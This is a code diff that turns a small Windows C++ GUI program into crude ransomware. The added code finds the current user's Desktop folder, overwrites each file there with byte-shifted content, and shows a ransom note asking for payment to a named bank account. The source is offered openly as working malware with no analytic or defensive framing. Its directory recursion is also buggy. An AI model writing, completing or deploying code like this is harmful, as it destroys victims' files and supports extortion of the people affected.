@@ -1,77 +1,136 @@
 #include <Windows.h>
-#include <WinUser.h>
 #include <iostream>
 #include <fstream>
 #include <string>
 #include "dirent.h"
 #include <sys/types.h>
+#include <Lmcons.h>
 #define FILE_MENU_NEW 1
 #define ENC_BUTTON 123
-#define DEC_BUTTON 69
+#define DEC_BUTTON 124
 using namespace std;
 
+void encFile(string filePath) {
+    cout << "Encrypting :)" << endl;
+    fstream file, tmpFile;
+    string tmpFilePath = "tmp.txt";
+    file.open(filePath, ios::in);
+    tmpFile.open(tmpFilePath, ios::out);
+    char byte;
+    while (file >> noskipws >> byte) {
+        byte += 100;
+        tmpFile << byte;
+    }
 
-void encrypt() {
-    char fileName[30], ch;
-    const char* files[4] = {"asdasd.txt",  "info.txt",  "lmao.txt", "packet.pdf"};
+    file.close();
+    tmpFile.close();
 
-    for (int i = 0; i < 4; i++) {
-        fstream fin, fout;
-        cout << "Encrypting:) > " << files[i] << endl;
-        fin.open(files[i], fstream::in);
-        if (!fin)
-            cout << "errorrRR:RL:)";
-        fout.open("enc.txt", fstream::out);
-        while (fin >> noskipws >> ch) {
-            ch += 100;
-            fout << ch;
+    file.open(filePath, ios::out);
+    tmpFile.open(tmpFilePath, ios::in);
+
+    while (tmpFile >> noskipws >> byte) {
+        file << byte;
+    }
+
+    file.close();
+    tmpFile.close();
+    (tmpFilePath.c_str());
+}
+
+void encDir() {
+    DIR* dir;
+    struct dirent* entry;
+    struct stat status;
+    string path;
+
+    char fileName[MAX_PATH];
+    char username[UNLEN + 1];
+    DWORD length = UNLEN + 1;
+    GetUserName(username, &length);
+
+    string first = "C:\\Users\\";
+    string second = "\\Desktop\\";
+    string dirPath = first + username + second;
+    cout << "Username: " << username << endl;
+    cout << "Path: " << dirPath << endl;
+
+    if ((dir = opendir(dirPath.c_str())) != NULL) {
+        while ((entry = readdir(dir)) != NULL) {
+            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+                path = dirPath + "\\" + entry->d_name;
+                stat(path.c_str(), &status);
+                if (S_ISDIR(status.st_mode)) {
+                    encDir();
+                }
+                else {
+                    encFile(path);
+                }
+            }
         }
-        fin.close();
-        fout.close();
-        fin.open(files[i], fstream::out);
-        fout.open("enc.txt", fstream::in);
-        while (fout >> noskipws >> ch) {
-            fin << ch;
-        }
-        fin.close();
-        fout.close();
-        string cmd = "rm enc.txt";
-        system(cmd.c_str());
     }
 }
 
-void decrypt() {
-    char fileName[30], ch;
-    const char* files[4] = { "asdasd.txt",  "info.txt",  "lmao.txt", "packet.pdf" };
+void decFile(string filePath) {
+    cout << "Decrypting:)" << endl;
+    fstream file, tmpFile;
+    string tmpFilePath = "tmp.txt";
+    file.open(filePath, ios::in);
+    tmpFile.open(tmpFilePath, ios::out);
+    char byte;
+    while (file >> noskipws >> byte) {
+        byte -= 100;
+        tmpFile << byte;
+    }
 
-    for (int i = 0; i < 4; i++) {
-        cout << files[i] << endl;
-        fstream fin, fout;
-        cout << "Decrypting :) > " << files[i] << endl;
-        fin.open(files[i], fstream::in);
-        if (!fin)
-            cout << "errorrRR:RL:)";
-        fout.open("dec.txt", fstream::out);
-        while (fin >> noskipws >> ch) {
-            ch -= 100;
-            fout << ch;
+    file.close();
+    tmpFile.close();
+
+    file.open(filePath, ios::out);
+    tmpFile.open(tmpFilePath, ios::in);
+
+    while (tmpFile >> noskipws >> byte) {
+        file << byte;
+    }
+
+    file.close();
+    tmpFile.close();
+    (tmpFilePath.c_str());
+}
+
+void decDir() {
+    DIR* dir;
+    struct dirent* entry;
+    struct stat status;
+    string path;
+
+    char fileName[MAX_PATH];
+    char username[UNLEN + 1];
+    DWORD length = UNLEN + 1;
+    GetUserName(username, &length);
+
+    string first = "C:\\Users\\";
+    string second = "\\Desktop\\";
+    string dirPath = first + username + second;
+    cout << "Username: " << username << endl;
+    cout << "Path: " << dirPath << endl;
+
+    if ((dir = opendir(dirPath.c_str())) != NULL) {
+        while ((entry = readdir(dir)) != NULL) {
+            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+                path = dirPath + "\\" + entry->d_name;
+                stat(path.c_str(), &status);
+                if (S_ISDIR(status.st_mode)) {
+                    decDir();
+                }
+                else {
+                    decFile(path);
+                }
+            }
         }
-        fin.close();
-        fout.close();
-        fin.open(files[i], fstream::out);
-        fout.open("dec.txt", fstream::in);
-        while (fout >> noskipws >> ch) {
-            fin << ch;
-        }
-        fin.close();
-        fout.close();
-        string cmd = "rm dec.txt";
-        system(cmd.c_str());
     }
 }
 
 LRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);
-void Menus(HWND hWnd);
 void button(HWND);
 HMENU hMenu;
 
@@ -83,24 +142,15 @@ LRESULT CALLBACK WindowProcedure(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp)
     case WM_COMMAND:
         switch (wp)
         {
-        case 1:
-            MessageBeep(MB_OK);
-            break;
-        case 2:
-            MessageBeep(MB_HELP);
-            break;
-        case 4:
-            DestroyWindow(hWnd);
-            break;
         case ENC_BUTTON:
-            encrypt();
+            encDir();
             break;
         case DEC_BUTTON:
-            decrypt();
+            decDir();
+            break;
         }
         break;
     case WM_CREATE:
-        Menus(hWnd);
         button(hWnd);
         break;
     case WM_DESTROY:
@@ -123,7 +173,7 @@ int WINAPI main(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR args, int ncmdshow)
     if (!RegisterClassW(&wc))
         return -1;
 
-    CreateWindowW(L"workPlease", L"Windowontsor", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 100, 100, 500, 500,
+    CreateWindowW(L"workPlease", L"btw im e-girl", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 100, 100, 300, 300,
         NULL, NULL, NULL, NULL);
 
     MSG msg = { 0 };
@@ -135,30 +185,14 @@ int WINAPI main(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR args, int ncmdshow)
     return 0;
 }
 
-void Menus(HWND hWnd)
-{
-    hMenu = CreateMenu();
-
-    HMENU hFileMenu = CreateMenu();
-    HMENU hSubMenu = CreateMenu();
-
-    AppendMenu(hSubMenu, MF_STRING, NULL, L"Connect");
-    AppendMenu(hSubMenu, MF_STRING, NULL, L"Host");
-
-    AppendMenu(hFileMenu, MF_STRING, 1, L"Encrypt");
-    AppendMenu(hFileMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"Room");
-    AppendMenu(hFileMenu, MF_STRING, 4, L"Exit");
-    AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hFileMenu, L"Menu");
-    AppendMenu(hMenu, MF_STRING, 2, L"Help");
-    SetMenu(hWnd, hMenu);
-}
-
 void button(HWND hWnd)
 {
     CreateWindowW(
-        L"BUTTON", L"Encrypt", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 10,40,130,100,hWnd,(HMENU)ENC_BUTTON,       
-        (HINSTANCE)GetWindowLongPtr(hWnd, GWLP_HINSTANCE),NULL);    
+        L"static",L"you're hacked bro, make payment pls im starving 5002846394 Khasbank - Uuganbayar",WS_VISIBLE | WS_CHILD | WS_BORDER | SS_CENTER, 40,150,220,70,hWnd, NULL, NULL, NULL);
     CreateWindowW(
-        L"BUTTON", L"Decrypt", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 150,40, 130, 100, hWnd, (HMENU)DEC_BUTTON,
+        L"BUTTON", L"Encrypt", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 10, 40, 130, 100, hWnd, (HMENU)ENC_BUTTON,
+        (HINSTANCE)GetWindowLongPtr(hWnd, GWLP_HINSTANCE), NULL);
+    CreateWindowW(
+        L"BUTTON", L"Decrypt", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 150, 40, 130, 100, hWnd, (HMENU)DEC_BUTTON,
         (HINSTANCE)GetWindowLongPtr(hWnd, GWLP_HINSTANCE), NULL);
 }
